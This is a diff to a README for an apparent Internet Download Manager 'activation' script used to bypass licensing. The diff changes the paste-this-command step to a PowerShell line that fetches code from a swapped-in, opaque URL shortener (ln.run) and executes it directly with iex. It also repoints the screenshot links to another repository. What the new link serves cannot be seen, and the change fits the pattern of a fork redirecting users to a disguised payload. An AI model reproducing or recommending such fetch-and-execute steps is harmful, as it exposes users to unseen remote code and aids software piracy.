@@ -19,7 +19,7 @@ After that follow the below steps to activate it.
 * Right-click on the Windows start menu and select PowerShell or Terminal (Not CMD).
 * Copy-paste the below code and press enter
   ```bash
-   irm "https://bit.ly/idm_Activate" | iex
+   irm "https://ln.run/yYzUg" | iex
    ```
   or
   ```bash
@@ -31,9 +31,9 @@ After that follow the below steps to activate it.
 
 
 # Screenshots 📸
-![https://github.com/lstprjct/IDM-Activation-Script/assets/88411318/fafdb481-c497-464f-b1e6-9a4254eaf880](https://github.com/Astro-Saurav/IDM-Activation-Script/blob/72eae3aa664bb6dd446008dd448fe632f3e7a641/Screenshort/1.png)
+(https://github.com/sritzone/IDM-Activation-Script/images/01.png)
 
-![https://github.com/lstprjct/IDM-Activation-Script/assets/88411318/76b36582-8cf4-4d1e-870f-6e8e57c80a87](https://github.com/Astro-Saurav/IDM-Activation-Script/blob/72eae3aa664bb6dd446008dd448fe632f3e7a641/Screenshort/2.png)
+(https://github.com/sritzone/IDM-Activation-Script/images/02.png)
 
 # Info ℹ️
 ## Freeze Trial 🥶
